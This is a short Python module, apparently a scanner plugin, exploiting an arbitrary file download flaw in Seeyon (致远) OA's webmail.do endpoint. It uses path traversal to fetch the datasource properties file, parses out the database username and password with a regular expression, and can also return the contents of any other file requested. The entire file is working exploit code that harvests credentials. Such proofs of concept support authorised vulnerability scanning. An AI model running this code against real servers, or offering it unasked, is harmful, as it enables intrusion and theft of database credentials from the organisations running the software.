# -*- coding:utf-8 -*-
# 致远OA_webmail.do任意文件下载
import re

from .. import requestUtil
from ServiceScanModel.models import ServiceScan

def webmail_download(url, file="../conf/datasourceCtp.properties", type="poc"):
    resp = requestUtil.get(
        url + "/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=%s"%file)
    if type == "poc":
        if "ctpDataSource.url" in resp.text:
            info = \
                re.findall(
                    "ctpDataSource.username=(.*?)workflow.dialect=(.*?)ctpDataSource.*?ctpDataSource.password=(.*?)ctpDataSource.url",
                    resp.text, re.DOTALL)[0]
            return info
        else:
            return False
    else:
        return resp.text



def fingerprint(service):
    try:
        if service.url:
            return True
    except:
        return False


def poc(service: ServiceScan):
    try:
        info = webmail_download(service.url)
        if info:
            return ["致远OA_webmail.do任意文件下载", "数据库: %s<br>用户名: %s<br>密码: %s" % (info[1], info[0], info[2])]
        else:
            return []
    except Exception as e:
        print(e)
        return []
